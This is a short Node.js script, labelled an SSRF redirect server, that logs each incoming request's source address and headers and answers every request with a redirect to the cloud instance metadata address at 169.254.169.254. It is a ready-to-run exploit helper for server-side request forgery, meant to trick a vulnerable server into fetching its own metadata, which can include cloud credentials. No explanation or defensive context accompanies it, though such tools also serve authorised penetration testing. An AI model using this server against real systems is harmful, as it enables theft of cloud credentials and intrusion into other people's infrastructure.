const http = require('http');

http.createServer((req, res) => {
  console.log(`${new Date().toISOString()} | ${req.method} ${req.url}`);
  console.log('From:', req.socket.remoteAddress);
  console.log('Headers:', JSON.stringify(req.headers));
  res.writeHead(301, {
    'Location': 'http://169.254.169.254/latest/meta-data/',
    'Content-Length': '0'
  });
  res.end();
}).listen(process.env.PORT || 3000, () => {
  console.log('SSRF redirect server running on port', process.env.PORT || 3000);
});
